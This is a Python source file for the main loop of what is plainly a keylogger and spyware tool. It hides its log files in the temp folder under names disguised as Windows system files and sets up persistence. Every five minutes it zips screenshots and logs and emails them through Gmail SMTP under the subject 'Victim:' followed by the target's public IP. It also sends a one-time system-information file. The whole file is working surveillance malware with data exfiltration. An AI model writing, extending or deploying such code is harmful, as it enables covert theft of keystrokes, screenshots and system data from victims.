from logger import Logger
from smtp import SMTP
import time
import tempfile
import pickle
from typing import NoReturn


class Main:
    PORT = 587
    HOST = "smtp.gmail.com"
    sender_email = ""
    sender_password = ""
    receiver_email = ""
    sent_basic_info = None

    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.load_persistent_data()
        self.logger = Logger(self.temp_dir, "WINSHandler.txt", "WindowsGeLp2.txt", "SystemPointerAlloc")
        self.smtp = SMTP(self.PORT, self.HOST, self.sender_email, self.sender_password, self.receiver_email)
        self.persistent_data_path = f"{self.temp_dir}\\SecureWIP.txt"
        self.public_ip = self.logger.get_public_ip()

    def load_persistent_data(self) -> None:
        """ read file and unpickle content """
        try:
            with open(self.persistent_data_path, "rb") as f:
                self.sent_basic_info = pickle.load(f)
        except FileNotFoundError:
            pass

    def save_persistent_data(self) -> None:
        """ (create and) write pickled data to file """
        with open(self.persistent_data_path, "wb") as f:
            pickle.dump(self.sent_basic_info, f)

    def main_loop(self, sleep: float) -> NoReturn:
        while True:
            time.sleep(sleep)
            self.logger.zip_screenshots()
            attachments = self.logger.get_log_files()
            try:
                self.smtp.mail(attachments, f"Victim: {self.public_ip}")
            except Exception as e:
                print(e)
            self.logger.cleanup()

    def main(self) -> None:
        self.logger.get_persistence()
        self.logger.start()
        self.logger.timed_logging(30, 1)
        self.smtp.start()
        # send basic info if they weren't send already
        if not self.sent_basic_info:
            system_file = self.logger.create_system_file()
            try:
                self.smtp.mail([system_file], f"Victim {self.public_ip}")
            except Exception as e:
                print(e)
            else:
                self.sent_basic_info = True
                self.save_persistent_data()
        self.main_loop(300)


if __name__ == "__main__":
    Main().main()
